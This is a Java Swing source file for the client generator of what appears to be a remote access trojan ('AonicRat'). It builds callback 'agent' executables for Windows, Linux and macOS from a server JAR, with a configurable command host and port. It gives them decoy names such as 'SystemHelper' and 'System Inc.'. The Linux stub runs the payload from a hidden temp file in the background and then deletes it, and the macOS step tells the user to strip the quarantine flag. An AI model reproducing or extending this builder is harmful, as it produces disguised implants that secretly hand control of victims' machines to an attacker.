package com.webaon.aonicrat;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.zip.*;

/**
 * Generates platform-specific agent executables from the SimpleServer fat JAR.
 *
 * Windows  → .exe  via Launch4j (auto-downloaded, runs on any host OS)
 * Linux    → self-extracting shell script (no tools needed)
 * macOS    → .app bundle zipped   (no tools needed)
 */
public class ClientGeneratorPanel extends JPanel {

    // ── Target OS ─────────────────────────────────────────────────────────────
    private final JCheckBox chkWindows = new JCheckBox("Windows (.exe)");
    private final JCheckBox chkLinux   = new JCheckBox("Linux (binary script)");
    private final JCheckBox chkMac     = new JCheckBox("macOS (.app.zip)");

    // ── App info ──────────────────────────────────────────────────────────────
    private final JTextField txtAppName  = new JTextField("SystemHelper", 18);
    private final JTextField txtVersion  = new JTextField("1.0.0",        10);
    private final JTextField txtDesc     = new JTextField("System Helper Utility", 28);
    private final JTextField txtCompany  = new JTextField("System Inc.",   18);

    // ── Server config ─────────────────────────────────────────────────────────
    private final JTextField txtHost = new JTextField("127.0.0.1", 16);
    private final JTextField txtPort = new JTextField("5555",       6);

    // ── Files ─────────────────────────────────────────────────────────────────
    private final JTextField txtSourceJar = new JTextField(32);
    private final JTextField txtIconFile  = new JTextField(32);
    private final JTextField txtOutputDir = new JTextField(32);

    // ── Progress / log ────────────────────────────────────────────────────────
    private final JButton    btnGenerate = new JButton("Generate");
    private final JProgressBar progress  = new JProgressBar(0, 100);
    private final JTextArea  logArea     = new JTextArea(7, 60);
    private final JLabel     statusLbl   = new JLabel("  Ready");

    public ClientGeneratorPanel() {
        setLayout(new BorderLayout());

        JPanel content = new JPanel(new BorderLayout(0, 4));
        content.setBorder(BorderFactory.createEmptyBorder(4, 8, 4, 8));
        content.add(buildForm(),    BorderLayout.NORTH);
        content.add(buildLogPane(), BorderLayout.CENTER);
        content.add(buildBottom(),  BorderLayout.SOUTH);

        JScrollPane scroll = new JScrollPane(content,
                JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,
                JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
        scroll.getVerticalScrollBar().setUnitIncrement(16);
        scroll.setBorder(null);
        add(scroll, BorderLayout.CENTER);

        autoDetectJar();
    }

    // ── UI ────────────────────────────────────────────────────────────────────

    private JPanel buildForm() {
        JPanel root = new JPanel();
        root.setLayout(new BoxLayout(root, BoxLayout.Y_AXIS));

        // Row 1 — target OS
        JPanel osRow = titled("Target Platform");
        chkWindows.setSelected(true);
        osRow.add(chkWindows); osRow.add(Box.createHorizontalStrut(20));
        osRow.add(chkLinux);   osRow.add(Box.createHorizontalStrut(20));
        osRow.add(chkMac);
        root.add(osRow);

        // Row 2 — app info  (GridBag, 2 rows so nothing overflows)
        JPanel infoRow = titledGBL("App Info");
        GridBagConstraints gi = gbc();
        // Line 1: App Name | Version | Company  (3 equal-ish columns)
        gi.gridx=0; gi.gridy=0; gi.fill=GridBagConstraints.NONE;       gi.weightx=0; infoRow.add(lbl("App Name:"), gi);
        gi.gridx=1;              gi.fill=GridBagConstraints.HORIZONTAL; gi.weightx=1; infoRow.add(txtAppName, gi);
        gi.gridx=2;              gi.fill=GridBagConstraints.NONE;       gi.weightx=0; infoRow.add(lbl("Version:"), gi);
        gi.gridx=3;              gi.fill=GridBagConstraints.HORIZONTAL; gi.weightx=0.5; infoRow.add(txtVersion, gi);
        gi.gridx=4;              gi.fill=GridBagConstraints.NONE;       gi.weightx=0; infoRow.add(lbl("Company:"), gi);
        gi.gridx=5;              gi.fill=GridBagConstraints.HORIZONTAL; gi.weightx=1; infoRow.add(txtCompany, gi);
        // Line 2: Description full-width
        gi.gridx=0; gi.gridy=1; gi.fill=GridBagConstraints.NONE;       gi.weightx=0; infoRow.add(lbl("Description:"), gi);
        gi.gridx=1; gi.gridwidth=5; gi.fill=GridBagConstraints.HORIZONTAL; gi.weightx=1; infoRow.add(txtDesc, gi);
        gi.gridwidth=1;
        root.add(infoRow);

        // Row 3 — server config
        JPanel srvRow = titled("Server Connection (where the agent calls back to)");
        srvRow.add(lbl("Host / IP:")); srvRow.add(txtHost);
        srvRow.add(Box.createHorizontalStrut(20));
        srvRow.add(lbl("Port:")); srvRow.add(txtPort);
        root.add(srvRow);

        // Row 4 — file pickers  (each on its own row so nothing is hidden)
        JPanel fileRow = titledGBL("Files");
        GridBagConstraints gf = gbc();
        filePickerRow(fileRow, gf, 0, "Source JAR:",      txtSourceJar, browseBtn(txtSourceJar, false, "JAR files", "jar"));
        filePickerRow(fileRow, gf, 1, "Icon (optional):", txtIconFile,  browseBtn(txtIconFile, false, "Icon files", "ico","icns","png"));
        filePickerRow(fileRow, gf, 2, "Output folder:",   txtOutputDir, browseBtn(txtOutputDir, true, null));
        root.add(fileRow);

        return root;
    }

    private JPanel buildLogPane() {
        JPanel p = new JPanel(new BorderLayout(0, 2));
        p.setBorder(BorderFactory.createTitledBorder("Build Log"));
        logArea.setFont(new Font("Consolas", Font.PLAIN, 11));
        logArea.setEditable(false);
        logArea.setBackground(new Color(30, 30, 30));
        logArea.setForeground(new Color(180, 255, 180));
        JScrollPane logScroll = new JScrollPane(logArea);
        logScroll.setWheelScrollingEnabled(false); // let wheel events reach the outer scroll pane
        p.add(logScroll, BorderLayout.CENTER);
        return p;
    }

    private JPanel buildBottom() {
        JPanel p = new JPanel(new BorderLayout(6, 0));
        p.setBackground(new Color(230, 230, 230));
        btnGenerate.setFont(btnGenerate.getFont().deriveFont(Font.BOLD, 13f));
        btnGenerate.setPreferredSize(new Dimension(160, 36));
        btnGenerate.addActionListener(e -> onGenerate());
        progress.setStringPainted(true);
        p.add(btnGenerate, BorderLayout.WEST);
        p.add(progress,    BorderLayout.CENTER);
        p.add(statusLbl,   BorderLayout.EAST);
        return p;
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    // FlowLayout panel (used for simple single-line rows like Target Platform, Server)
    private JPanel titled(String title) {
        JPanel p = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 4));
        p.setBorder(BorderFactory.createTitledBorder(title));
        return p;
    }
    // GridBagLayout panel (used when rows must fill the full width)
    private JPanel titledGBL(String title) {
        JPanel p = new JPanel(new GridBagLayout());
        p.setBorder(BorderFactory.createTitledBorder(title));
        return p;
    }
    // Fresh GridBagConstraints with standard insets
    private GridBagConstraints gbc() {
        GridBagConstraints g = new GridBagConstraints();
        g.insets = new Insets(3, 5, 3, 5);
        g.anchor = GridBagConstraints.WEST;
        return g;
    }
    // One label + expanding text field + browse button on a dedicated row
    private void filePickerRow(JPanel p, GridBagConstraints g, int gridy,
                                String labelText, JTextField field, JButton btn) {
        g.gridx=0; g.gridy=gridy; g.fill=GridBagConstraints.NONE;       g.weightx=0;
        p.add(lbl(labelText), g);
        g.gridx=1; g.fill=GridBagConstraints.HORIZONTAL; g.weightx=1;
        p.add(field, g);
        g.gridx=2; g.fill=GridBagConstraints.NONE;       g.weightx=0;
        p.add(btn, g);
    }
    private JLabel lbl(String t) { return new JLabel(t); }

    private JButton browseBtn(JTextField target, boolean dirOnly, String desc, String... exts) {
        JButton b = new JButton("…");
        b.setPreferredSize(new Dimension(28, 22));
        b.addActionListener(e -> {
            JFileChooser fc = new JFileChooser();
            if (dirOnly) {
                fc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
            } else if (exts != null && exts.length > 0) {
                fc.setFileFilter(new javax.swing.filechooser.FileNameExtensionFilter(desc, exts));
            }
            String cur = target.getText().trim();
            if (!cur.isEmpty()) fc.setCurrentDirectory(new File(cur).getParentFile());
            if (fc.showOpenDialog(this) == JFileChooser.APPROVE_OPTION)
                target.setText(fc.getSelectedFile().getAbsolutePath());
        });
        return b;
    }

    private void autoDetectJar() {
        // Try to find SimpleServer.jar in sibling project folders
        String base = System.getProperty("user.dir");
        String[] candidates = {
            base + "/../SimpleServer/target/SimpleServer-1.0.0-beta.jar",
            base + "/../SimpleServer/target/SimpleServer-1.0.0.jar",
            base + "/../SimpleServer/SimpleServer.jar",
        };
        for (String c : candidates) {
            File f = new File(c);
            if (f.exists()) { txtSourceJar.setText(f.getAbsolutePath()); break; }
        }
        txtOutputDir.setText(System.getProperty("user.home") + File.separator + "Desktop");
    }

    private void log(String line) {
        SwingUtilities.invokeLater(() -> {
            logArea.append(line + "\n");
            logArea.setCaretPosition(logArea.getDocument().getLength());
        });
    }
    private void status(String s) {
        SwingUtilities.invokeLater(() -> statusLbl.setText("  " + s));
    }
    private void setProgress(int pct) {
        SwingUtilities.invokeLater(() -> { progress.setValue(pct); progress.setString(pct + "%"); });
    }

    // ── Generate button handler ───────────────────────────────────────────────

    private void onGenerate() {
        if (!chkWindows.isSelected() && !chkLinux.isSelected() && !chkMac.isSelected()) {
            JOptionPane.showMessageDialog(this, "Select at least one target platform.");
            return;
        }
        File sourceJar = new File(txtSourceJar.getText().trim());
        if (!sourceJar.exists()) {
            JOptionPane.showMessageDialog(this,
                "Source JAR not found: " + sourceJar + "\nBuild SimpleServer first (Run > Build Project).");
            return;
        }
        File outputDir = new File(txtOutputDir.getText().trim());
        outputDir.mkdirs();

        String appName  = txtAppName.getText().trim();
        String version  = txtVersion.getText().trim();
        String desc     = txtDesc.getText().trim();
        String company  = txtCompany.getText().trim();
        String host     = txtHost.getText().trim();
        int    port;
        try { port = Integer.parseInt(txtPort.getText().trim()); }
        catch (NumberFormatException ex) { JOptionPane.showMessageDialog(this, "Invalid port."); return; }

        String iconPath = txtIconFile.getText().trim();
        File   iconFile = iconPath.isEmpty() ? null : new File(iconPath);

        btnGenerate.setEnabled(false);
        logArea.setText("");
        progress.setValue(0);

        new Thread(() -> {
            try {
                log("=== AonicRat Client Generator ===");
                log("App: " + appName + " v" + version);
                log("Server: " + host + ":" + port);
                log("");

                // 1. Inject aon.properties into a copy of the JAR
                log("[1/4] Injecting server config into JAR…");
                File configuredJar = injectConfig(sourceJar, host, port, outputDir, appName);
                setProgress(20);

                // 2. Generate selected platforms
                int step = 2;
                if (chkWindows.isSelected()) {
                    log("[" + step + "/4] Generating Windows .exe…");
                    generateWindows(configuredJar, appName, version, desc, company, iconFile, outputDir);
                    step++;
                }
                if (chkLinux.isSelected()) {
                    log("[" + step + "/4] Generating Linux binary…");
                    generateLinux(configuredJar, appName, host, port, outputDir);
                    setProgress(70);
                    step++;
                }
                if (chkMac.isSelected()) {
                    log("[" + step + "/4] Generating macOS .app…");
                    generateMac(configuredJar, appName, version, desc, company, iconFile, outputDir);
                    setProgress(90);
                }

                // 3. Clean up temp configured JAR (keep if output dir wanted it)
                configuredJar.delete();

                setProgress(100);
                status("Done — files saved to " + outputDir);
                log("");
                log("=== All selected targets generated successfully ===");
                log("Output: " + outputDir.getAbsolutePath());
            } catch (Exception ex) {
                log("ERROR: " + ex.getMessage());
                status("Failed: " + ex.getMessage());
            } finally {
                SwingUtilities.invokeLater(() -> btnGenerate.setEnabled(true));
            }
        }, "client-gen").start();
    }

    // ── Step 1: Inject aon.properties into JAR ────────────────────────────────

    private File injectConfig(File sourceJar, String host, int port,
                               File outputDir, String appName) throws IOException {
        File out = new File(outputDir, appName + "-agent.jar");
        try (ZipInputStream  zis = new ZipInputStream(new FileInputStream(sourceJar));
             ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(out))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                if ("aon.properties".equals(entry.getName())) {
                    zis.closeEntry(); continue; // replace existing
                }
                ZipEntry outEntry = new ZipEntry(entry.getName());
                zos.putNextEntry(outEntry);
                byte[] buf = new byte[8192]; int n;
                while ((n = zis.read(buf)) != -1) zos.write(buf, 0, n);
                zos.closeEntry();
                zis.closeEntry();
            }
            // Write the new config
            zos.putNextEntry(new ZipEntry("aon.properties"));
            String cfg = "host=" + host + "\nport=" + port + "\n";
            zos.write(cfg.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        }
        log("    Config JAR: " + out.getName() + " (" + out.length()/1024 + " KB)");
        return out;
    }

    // ── Step 2a: Windows .exe via Launch4j ────────────────────────────────────

    private void generateWindows(File jar, String appName, String version,
                                  String desc, String company, File iconFile,
                                  File outputDir) throws Exception {
        File launch4jDir = ensureLaunch4j();
        File outExe      = new File(outputDir, appName + ".exe");

        // Build the Launch4j XML config
        String iconXml = "";
        if (iconFile != null && iconFile.exists() && iconFile.getName().endsWith(".ico")) {
            iconXml = "    <icon>" + iconFile.getAbsolutePath().replace("\\","\\\\") + "</icon>\n";
        }
        String ver4 = toFourPartVersion(version);
        String xml =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<launch4jConfig>\n" +
            "  <dontWrapJar>false</dontWrapJar>\n" +
            "  <headerType>gui</headerType>\n" +
            "  <jar>" + jar.getAbsolutePath().replace("\\","\\\\") + "</jar>\n" +
            "  <outfile>" + outExe.getAbsolutePath().replace("\\","\\\\") + "</outfile>\n" +
            "  <errTitle>" + xmlEsc(appName) + "</errTitle>\n" +
            "  <chdir>.</chdir>\n" +
            "  <priority>normal</priority>\n" +
            "  <downloadUrl>https://java.com/download</downloadUrl>\n" +
            "  <stayAlive>false</stayAlive>\n" +
            "  <restartOnCrash>false</restartOnCrash>\n" +
            iconXml +
            "  <jre>\n" +
            "    <minVersion>11</minVersion>\n" +
            "    <jdkPreference>preferJre</jdkPreference>\n" +
            "    <runtimeBits>64/32</runtimeBits>\n" +
            "  </jre>\n" +
            "  <versionInfo>\n" +
            "    <fileVersion>" + ver4 + "</fileVersion>\n" +
            "    <txtFileVersion>" + xmlEsc(version) + "</txtFileVersion>\n" +
            "    <fileDescription>" + xmlEsc(desc) + "</fileDescription>\n" +
            "    <copyright>Copyright " + java.time.Year.now() + " " + xmlEsc(company) + "</copyright>\n" +
            "    <productVersion>" + ver4 + "</productVersion>\n" +
            "    <txtProductVersion>" + xmlEsc(version) + "</txtProductVersion>\n" +
            "    <productName>" + xmlEsc(appName) + "</productName>\n" +
            "    <companyName>" + xmlEsc(company) + "</companyName>\n" +
            "    <internalName>" + xmlEsc(appName.replaceAll("\\s+","")) + "</internalName>\n" +
            "    <originalFilename>" + xmlEsc(appName) + ".exe</originalFilename>\n" +
            "  </versionInfo>\n" +
            "</launch4jConfig>\n";

        File xmlFile = File.createTempFile("l4j_", ".xml");
        xmlFile.deleteOnExit();
        Files.write(xmlFile.toPath(), xml.getBytes(StandardCharsets.UTF_8));

        // Run launch4jc.jar
        File l4jJar = new File(launch4jDir, "launch4jc.jar");
        log("    Running Launch4j: " + l4jJar.getAbsolutePath());
        Process p = new ProcessBuilder(
                "java", "-jar", l4jJar.getAbsolutePath(), xmlFile.getAbsolutePath())
            .redirectErrorStream(true).directory(launch4jDir).start();

        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null) log("    " + line);
        }
        int exit = p.waitFor();
        xmlFile.delete();
        setProgress(50);

        if (exit == 0 && outExe.exists()) {
            log("    OK → " + outExe.getName() + " (" + outExe.length()/1024 + " KB)");
        } else {
            throw new RuntimeException("Launch4j exited with code " + exit +
                ". Check log above. Make sure Java is in PATH.");
        }
    }

    // ── Step 2b: Linux self-extracting binary script ─────────────────────────

    private void generateLinux(File jar, String appName,
                                String host, int port, File outputDir) throws Exception {
        File outFile = new File(outputDir, appName);

        // Read and base64-encode the JAR
        byte[] jarBytes = Files.readAllBytes(jar.toPath());
        String b64Jar   = java.util.Base64.getEncoder().encodeToString(jarBytes);

        // Build the self-extracting shell script
        // The JAR data is embedded as base64 after the script header
        String script =
            "#!/bin/sh\n" +
            "# " + appName + " v" + txtVersion.getText().trim() + "\n" +
            "T=$(mktemp /tmp/." + appName.toLowerCase().replaceAll("[^a-z0-9]","") + "XXXXXXXXXX)\n" +
            "sed '1,/^#__DATA__$/d' \"$0\" | base64 -d > \"$T\"\n" +
            "nohup java" +
            " -Daon.host=" + host + " -Daon.port=" + port +
            " -jar \"$T\" >/dev/null 2>&1 &\n" +
            "JPID=$!\n" +
            "sleep 3\n" +
            "rm -f \"$T\"\n" +
            "exit 0\n" +
            "#__DATA__\n" +
            b64Jar + "\n";

        Files.write(outFile.toPath(), script.getBytes(StandardCharsets.UTF_8));

        // Make executable on Unix-like hosts
        try { outFile.setExecutable(true, false); } catch (Exception ignored) {}

        log("    OK → " + outFile.getName() + " (" + outFile.length()/1024 + " KB)");
        log("    Deploy with: chmod +x " + appName + " && ./" + appName);
        log("    Requires Java 11+ on target Linux device.");
    }

    // ── Step 2c: macOS .app bundle ────────────────────────────────────────────

    private void generateMac(File jar, String appName, String version,
                              String desc, String company,
                              File iconFile, File outputDir) throws Exception {
        // .app is a directory bundle — we create it then zip it
        File appDir     = new File(outputDir, appName + ".app");
        File contents   = new File(appDir,    "Contents");
        File macOS      = new File(contents,  "MacOS");
        File resources  = new File(contents,  "Resources");
        File javaDir    = new File(contents,  "Java");
        macOS.mkdirs(); resources.mkdirs(); javaDir.mkdirs();

        // Copy JAR
        File bundledJar = new File(javaDir, "agent.jar");
        Files.copy(jar.toPath(), bundledJar.toPath(), StandardCopyOption.REPLACE_EXISTING);

        // Launcher shell script (Contents/MacOS/AppName)
        File launcher = new File(macOS, appName);
        String sh =
            "#!/bin/sh\n" +
            "DIR=\"$(cd \"$(dirname \"$0\")\" && pwd)\"\n" +
            "nohup java" +
            " -Daon.host=" + txtHost.getText().trim() +
            " -Daon.port=" + txtPort.getText().trim() +
            " -jar \"$DIR/../Java/agent.jar\" >/dev/null 2>&1 &\n";
        Files.write(launcher.toPath(), sh.getBytes(StandardCharsets.UTF_8));
        launcher.setExecutable(true, false);

        // Info.plist
        String bundleId = company.replaceAll("[^a-zA-Z0-9]","").toLowerCase()
                        + "." + appName.replaceAll("[^a-zA-Z0-9]","").toLowerCase();
        String plist =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n" +
            "  \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" +
            "<plist version=\"1.0\"><dict>\n" +
            "  <key>CFBundleName</key><string>" + xmlEsc(appName) + "</string>\n" +
            "  <key>CFBundleDisplayName</key><string>" + xmlEsc(appName) + "</string>\n" +
            "  <key>CFBundleIdentifier</key><string>" + bundleId + "</string>\n" +
            "  <key>CFBundleVersion</key><string>" + xmlEsc(version) + "</string>\n" +
            "  <key>CFBundleShortVersionString</key><string>" + xmlEsc(version) + "</string>\n" +
            "  <key>CFBundleExecutable</key><string>" + xmlEsc(appName) + "</string>\n" +
            "  <key>CFBundlePackageType</key><string>APPL</string>\n" +
            "  <key>CFBundleSignature</key><string>????</string>\n" +
            "  <key>NSHighResolutionCapable</key><true/>\n" +
            (iconFile != null && iconFile.exists() && iconFile.getName().endsWith(".icns")
                ? "  <key>CFBundleIconFile</key><string>" + xmlEsc(iconFile.getName()) + "</string>\n"
                : "") +
            "</dict></plist>\n";
        Files.write(new File(contents, "Info.plist").toPath(),
            plist.getBytes(StandardCharsets.UTF_8));

        // Copy icon if provided
        if (iconFile != null && iconFile.exists() && iconFile.getName().endsWith(".icns"))
            Files.copy(iconFile.toPath(), new File(resources, iconFile.getName()).toPath(),
                StandardCopyOption.REPLACE_EXISTING);

        // Zip the .app bundle into a .app.zip
        File zipOut = new File(outputDir, appName + ".app.zip");
        zipDirectory(appDir, zipOut, outputDir);

        // Remove the unzipped bundle (keep only the zip)
        deleteDir(appDir);

        log("    OK → " + zipOut.getName() + " (" + zipOut.length()/1024 + " KB)");
        log("    Unzip on Mac, then: xattr -rd com.apple.quarantine " + appName + ".app");
    }

    // ── Launch4j bootstrap ────────────────────────────────────────────────────

    private static final String LAUNCH4J_VERSION = "3.50";

    private File ensureLaunch4j() throws Exception {
        File toolsDir = new File(System.getProperty("user.home"), ".aonicrat" + File.separator + "tools");
        File l4jDir   = new File(toolsDir, "launch4j");
        File l4jJar   = new File(l4jDir,   "launch4jc.jar");

        if (l4jJar.exists()) {
            log("    Launch4j already present: " + l4jDir);
            return l4jDir;
        }

        toolsDir.mkdirs();
        String os = System.getProperty("os.name").toLowerCase();
        String suffix;
        if      (os.contains("win"))             suffix = "win32.zip";
        else if (os.contains("mac")||os.contains("darwin")) suffix = "macosx-x86.tgz";
        else                                     suffix = "linux-x64.tgz";

        String url = "https://sourceforge.net/projects/launch4j/files/launch4j-3/"
                   + LAUNCH4J_VERSION + "/launch4j-" + LAUNCH4J_VERSION + "-" + suffix
                   + "/download";
        log("    Downloading Launch4j from SourceForge (~3 MB)…");
        log("    " + url);

        File archive = new File(toolsDir, "launch4j." + (suffix.endsWith(".zip") ? "zip" : "tgz"));
        try (InputStream in  = openWithRedirects(url);
             OutputStream out = new FileOutputStream(archive)) {
            byte[] buf = new byte[16384]; int n;
            long total = 0;
            while ((n = in.read(buf)) != -1) { out.write(buf, 0, n); total += n; }
            log("    Downloaded " + total/1024 + " KB");
        }

        log("    Extracting Launch4j…");
        if (suffix.endsWith(".zip")) extractZip(archive, toolsDir);
        else                         extractTgz(archive, toolsDir);
        archive.delete();

        // Find the actual launch4jc.jar (may be nested)
        File found = findFile(toolsDir, "launch4jc.jar");
        if (found == null) throw new RuntimeException("launch4jc.jar not found after extraction");
        File actualDir = found.getParentFile();
        log("    Launch4j ready: " + actualDir);
        return actualDir;
    }

    private InputStream openWithRedirects(String urlStr) throws Exception {
        int max = 8;
        while (max-- > 0) {
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.connect();
            int code = conn.getResponseCode();
            if (code == 200) return conn.getInputStream();
            if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
                urlStr = conn.getHeaderField("Location");
                conn.disconnect();
                continue;
            }
            throw new IOException("HTTP " + code + " from " + urlStr);
        }
        throw new IOException("Too many redirects");
    }

    // ── ZIP / TAR utilities ───────────────────────────────────────────────────

    private void extractZip(File zip, File destDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zip))) {
            ZipEntry e;
            while ((e = zis.getNextEntry()) != null) {
                File f = new File(destDir, e.getName()).getCanonicalFile();
                if (!f.toPath().startsWith(destDir.getCanonicalPath()))
                    throw new IOException("Zip slip: " + e.getName());
                if (e.isDirectory()) { f.mkdirs(); }
                else {
                    f.getParentFile().mkdirs();
                    try (OutputStream os = new FileOutputStream(f)) {
                        byte[] buf = new byte[8192]; int n;
                        while ((n = zis.read(buf)) != -1) os.write(buf, 0, n);
                    }
                }
                zis.closeEntry();
            }
        }
    }

    /** Extracts .tgz using pure Java (no native tar needed). */
    private void extractTgz(File tgz, File destDir) throws IOException {
        // GZIPInputStream then read TAR blocks manually
        try (java.util.zip.GZIPInputStream gis =
                new java.util.zip.GZIPInputStream(new FileInputStream(tgz))) {
            byte[] header = new byte[512];
            while (true) {
                int read = 0, n;
                while (read < 512 && (n = gis.read(header, read, 512-read)) != -1) read += n;
                if (read < 512) break;
                // Check for end-of-archive (two 512-byte blocks of zeros)
                boolean allZero = true;
                for (byte b : header) if (b != 0) { allZero = false; break; }
                if (allZero) break;

                String name = readTarString(header, 0, 100);
                if (name.isEmpty()) break;
                char typeflag = (char) header[156];
                long size = Long.parseLong(readTarString(header, 124, 12).trim(), 8);

                File dest = new File(destDir, name).getCanonicalFile();
                if (!dest.toPath().startsWith(destDir.getCanonicalPath()))
                    throw new IOException("Tar slip: " + name);

                if (typeflag == '5' || name.endsWith("/")) {
                    dest.mkdirs();
                    // no data blocks
                } else {
                    dest.getParentFile().mkdirs();
                    try (OutputStream os = new FileOutputStream(dest)) {
                        long remaining = size;
                        byte[] buf = new byte[8192];
                        while (remaining > 0) {
                            int chunk = (int) Math.min(buf.length, remaining);
                            n = gis.read(buf, 0, chunk);
                            if (n == -1) break;
                            os.write(buf, 0, n);
                            remaining -= n;
                        }
                    }
                    // set executable bit on launcher scripts
                    int mode = Integer.parseInt(readTarString(header, 100, 8).trim(), 8);
                    if ((mode & 0111) != 0) dest.setExecutable(true, false);
                }

                // Skip to next 512-byte boundary
                long blocks = (size + 511) / 512;
                long skip   = blocks * 512 - size;
                if (skip > 0) { byte[] pad = new byte[(int)skip]; gis.read(pad); }
            }
        }
    }

    private String readTarString(byte[] buf, int off, int len) {
        int end = off;
        while (end < off + len && buf[end] != 0) end++;
        return new String(buf, off, end - off, StandardCharsets.UTF_8);
    }

    private void zipDirectory(File dir, File zipFile, File baseDir) throws IOException {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            addToZip(dir, baseDir.getCanonicalPath().length() + 1, zos);
        }
    }

    private void addToZip(File file, int prefixLen, ZipOutputStream zos) throws IOException {
        String entryName = file.getCanonicalPath().substring(prefixLen).replace('\\', '/');
        if (file.isDirectory()) {
            zos.putNextEntry(new ZipEntry(entryName + "/"));
            zos.closeEntry();
            File[] children = file.listFiles();
            if (children != null) for (File child : children) addToZip(child, prefixLen, zos);
        } else {
            zos.putNextEntry(new ZipEntry(entryName));
            Files.copy(file.toPath(), zos);
            zos.closeEntry();
        }
    }

    private File findFile(File dir, String name) {
        File f = new File(dir, name);
        if (f.exists()) return f;
        File[] children = dir.listFiles();
        if (children != null) for (File c : children) {
            if (c.isDirectory()) { File found = findFile(c, name); if (found != null) return found; }
        }
        return null;
    }

    private void deleteDir(File dir) {
        if (!dir.exists()) return;
        File[] files = dir.listFiles();
        if (files != null) for (File f : files)
            if (f.isDirectory()) deleteDir(f); else f.delete();
        dir.delete();
    }

    // ── String utilities ──────────────────────────────────────────────────────

    private String xmlEsc(String s) {
        return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace("\"","&quot;");
    }

    private String toFourPartVersion(String v) {
        String[] parts = v.split("[.\\-]");
        String[] r = {"1","0","0","0"};
        for (int i = 0; i < Math.min(parts.length, 4); i++) {
            try { r[i] = String.valueOf(Integer.parseInt(parts[i])); }
            catch (NumberFormatException ignored) {}
        }
        return r[0] + "." + r[1] + "." + r[2] + "." + r[3];
    }
}
